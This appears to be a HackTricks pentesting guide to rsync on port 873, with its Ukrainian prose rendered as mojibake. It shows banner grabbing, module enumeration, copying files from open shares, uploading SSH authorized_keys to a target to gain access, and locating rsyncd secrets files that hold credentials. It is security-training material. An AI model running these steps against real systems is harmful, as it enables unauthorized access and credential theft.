# 873 - Pentesting Rsync

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **–û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è**

–ó [–≤—ñ–∫—ñ–ø–µ–¥—ñ—ó](https://en.wikipedia.org/wiki/Rsync):

> **rsync** - —Ü–µ —É—Ç–∏–ª—ñ—Ç–∞ –¥–ª—è –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ–≥–æ [–ø–µ—Ä–µ–Ω–µ—Å–µ–Ω–Ω—è](https://en.wikipedia.org/wiki/File\_transfer) —Ç–∞ [—Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—ó](https://en.wikipedia.org/wiki/File\_synchronization) [—Ñ–∞–π–ª—ñ–≤](https://en.wikipedia.org/wiki/Computer\_file) –º—ñ–∂ –∫–æ–º–ø'—é—Ç–µ—Ä–æ–º —Ç–∞ –∑–æ–≤–Ω—ñ—à–Ω—ñ–º –∂–æ—Ä—Å—Ç–∫–∏–º –¥–∏—Å–∫–æ–º, –∞ —Ç–∞–∫–æ–∂ –º—ñ–∂ [–º–µ—Ä–µ–∂–µ–≤–∏–º–∏](https://en.wikipedia.org/wiki/Computer\_network) [–∫–æ–º–ø'—é—Ç–µ—Ä–∞–º–∏](https://en.wikipedia.org/wiki/Computer) —à–ª—è—Ö–æ–º –ø–æ—Ä—ñ–≤–Ω—è–Ω–Ω—è [—á–∞—Å—ñ–≤ –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—ó](https://en.wikipedia.org/wiki/Timestamping\_\(computing\)) —Ç–∞ —Ä–æ–∑–º—ñ—Ä—ñ–≤ —Ñ–∞–π–ª—ñ–≤.[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite\_note-man\_page-3) –í–æ–Ω–∞ –∑–∞–∑–≤–∏—á–∞–π –∑—É—Å—Ç—Ä—ñ—á–∞—î—Ç—å—Å—è –Ω–∞ [Unix-–ø–æ–¥—ñ–±–Ω–∏—Ö](https://en.wikipedia.org/wiki/Unix-like) [–æ–ø–µ—Ä–∞—Ü—ñ–π–Ω–∏—Ö —Å–∏—Å—Ç–µ–º–∞—Ö](https://en.wikipedia.org/wiki/Operating\_system). –ê–ª–≥–æ—Ä–∏—Ç–º rsync —î —Ç–∏–ø–æ–º [–¥–µ–ª—å—Ç–∞-–∫–æ–¥—É–≤–∞–Ω–Ω—è](https://en.wikipedia.org/wiki/Delta\_encoding) —ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –º—ñ–Ω—ñ–º—ñ–∑–∞—Ü—ñ—ó –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –º–µ—Ä–µ–∂—ñ. [Zlib](https://en.wikipedia.org/wiki/Zlib) –º–æ–∂–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏—Å—è –¥–ª—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ–≥–æ [—Å—Ç–∏—Å–Ω–µ–Ω–Ω—è –¥–∞–Ω–∏—Ö](https://en.wikipedia.org/wiki/Data\_compression),[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite\_note-man\_page-3) –∞ [SSH](https://en.wikipedia.org/wiki/Secure\_Shell) –∞–±–æ [stunnel](https://en.wikipedia.org/wiki/Stunnel) –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏—Å—è –¥–ª—è –±–µ–∑–ø–µ–∫–∏.

**–ü–æ—Ä—Ç –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º:** 873
```
PORT    STATE SERVICE REASON
873/tcp open  rsync   syn-ack
```
## –ü–µ—Ä–µ—Ä–∞—Ö—É–≤–∞–Ω–Ω—è

### –ë–∞–Ω–µ—Ä —Ç–∞ —Ä—É—á–Ω–∞ –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—è
```bash
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0        <--- You receive this banner with the version from the server
@RSYNCD: 31.0        <--- Then you send the same info
#list                <--- Then you ask the sever to list
raidroot             <--- The server starts enumerating
USBCopy
NAS_Public
_NAS_Recycle_TOSRAID	<--- Enumeration finished
@RSYNCD: EXIT         <--- Sever closes the connection


#Now lets try to enumerate "raidroot"
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
raidroot
@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g    <--- This means you need the password
```
### **–ü–µ—Ä–µ—Ä–∞—Ö—É–≤–∞–Ω–Ω—è —Å–ø—ñ–ª—å–Ω–∏—Ö –ø–∞–ø–æ–∫**

**–ú–æ–¥—É–ª—ñ Rsync** –≤–≤–∞–∂–∞—é—Ç—å—Å—è **—Å–ø—ñ–ª—å–Ω–∏–º–∏ –∫–∞—Ç–∞–ª–æ–≥–∞–º–∏**, —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ **–∑–∞—Ö–∏—â–µ–Ω—ñ –ø–∞—Ä–æ–ª—è–º–∏**. –©–æ–± –≤–∏–∑–Ω–∞—á–∏—Ç–∏ –¥–æ—Å—Ç—É–ø–Ω—ñ –º–æ–¥—É–ª—ñ —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –ø–æ—Ç—Ä—ñ–±–Ω—ñ –ø–∞—Ä–æ–ª—ñ, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è —Ç–∞–∫—ñ –∫–æ–º–∞–Ω–¥–∏:
```bash
nmap -sV --script "rsync-list-modules" -p <PORT> <IP>
msf> use auxiliary/scanner/rsync/modules_list

# Example with IPv6 and alternate port
rsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730
```
–ë—É–¥—å—Ç–µ –æ–±–µ—Ä–µ–∂–Ω—ñ, —â–æ –¥–µ—è–∫—ñ —Å–ø—ñ–ª—å–Ω—ñ —Ä–µ—Å—É—Ä—Å–∏ –º–æ–∂—É—Ç—å –Ω–µ –∑'—è–≤–∏—Ç–∏—Å—è –≤ —Å–ø–∏—Å–∫—É, –º–æ–∂–ª–∏–≤–æ, —ó—Ö –ø—Ä–∏—Ö–æ–≤–∞–Ω–æ. –ö—Ä—ñ–º —Ç–æ–≥–æ, –¥–æ—Å—Ç—É–ø –¥–æ –¥–µ—è–∫–∏—Ö —Å–ø—ñ–ª—å–Ω–∏—Ö —Ä–µ—Å—É—Ä—Å—ñ–≤ –º–æ–∂–µ –±—É—Ç–∏ –æ–±–º–µ–∂–µ–Ω–∏–π –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–º–∏ **–æ–±–ª—ñ–∫–æ–≤–∏–º–∏ –¥–∞–Ω–∏–º–∏**, —â–æ –≤–∫–∞–∑—É—î—Ç—å—Å—è –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è–º **"–î–æ—Å—Ç—É–ø –∑–∞–±–æ—Ä–æ–Ω–µ–Ω–æ"**.

### [**Brute Force**](../generic-methodologies-and-resources/brute-force.md#rsync)

### –†—É—á–Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è Rsync

–ü—ñ—Å–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è **—Å–ø–∏—Å–∫—É –º–æ–¥—É–ª—ñ–≤** –¥—ñ—ó –∑–∞–ª–µ–∂–∞—Ç—å –≤—ñ–¥ —Ç–æ–≥–æ, —á–∏ –ø–æ—Ç—Ä—ñ–±–Ω–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è. –ë–µ–∑ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó **–ø–µ—Ä–µ–ª—ñ–∫** —ñ **–∫–æ–ø—ñ—é–≤–∞–Ω–Ω—è** —Ñ–∞–π–ª—ñ–≤ –∑ –∑–∞–≥–∞–ª—å–Ω–æ—ó –ø–∞–ø–∫–∏ –¥–æ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –∫–∞—Ç–∞–ª–æ–≥—É –∑–¥—ñ–π—Å–Ω—é—î—Ç—å—Å—è —á–µ—Ä–µ–∑:
```bash
# Listing a shared folder
rsync -av --list-only rsync://192.168.0.123/shared_name

# Copying files from a shared folder
rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared
```
–¶–µ–π –ø—Ä–æ—Ü–µ—Å **—Ä–µ–∫—É—Ä—Å–∏–≤–Ω–æ –ø–µ—Ä–µ–¥–∞—î —Ñ–∞–π–ª–∏**, –∑–±–µ—Ä—ñ–≥–∞—é—á–∏ —ó—Ö –∞—Ç—Ä–∏–±—É—Ç–∏ —Ç–∞ –¥–æ–∑–≤–æ–ª–∏.

–ó **–æ–±–ª—ñ–∫–æ–≤–∏–º–∏ –¥–∞–Ω–∏–º–∏** —Å–ø–∏—Å–æ–∫ —ñ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∑ –∑–∞–≥–∞–ª—å–Ω–æ—ó –ø–∞–ø–∫–∏ –º–æ–∂–Ω–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–º —á–∏–Ω–æ–º, –¥–µ –∑'—è–≤–∏—Ç—å—Å—è –∑–∞–ø–∏—Ç –Ω–∞ –≤–≤–µ–¥–µ–Ω–Ω—è –ø–∞—Ä–æ–ª—è:
```bash
rsync -av --list-only rsync://username@192.168.0.123/shared_name
rsync -av rsync://username@192.168.0.123:8730/shared_name ./rsyn_shared
```
–©–æ–± **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –≤–º—ñ—Å—Ç**, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —Ñ–∞–π–ª _**authorized_keys**_ –¥–ª—è –¥–æ—Å—Ç—É–ø—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ:
```bash
rsync -av home_user/.ssh/ rsync://username@192.168.0.123/home_user/.ssh
```
## POST

–©–æ–± –∑–Ω–∞–π—Ç–∏ —Ñ–∞–π–ª –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó rsyncd, –≤–∏–∫–æ–Ω–∞–π—Ç–µ:
```bash
find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
```
–£ —Ü—å–æ–º—É —Ñ–∞–π–ª—ñ –ø–∞—Ä–∞–º–µ—Ç—Ä _secrets file_ –º–æ–∂–µ –≤–∫–∞–∑—É–≤–∞—Ç–∏ –Ω–∞ —Ñ–∞–π–ª, —â–æ –º—ñ—Å—Ç–∏—Ç—å **—ñ–º–µ–Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —Ç–∞ –ø–∞—Ä–æ–ª—ñ** –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó rsyncd.

## References
* [https://www.smeegesec.com/2016/12/pentesting-rsync.html](https://www.smeegesec.com/2016/12/pentesting-rsync.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
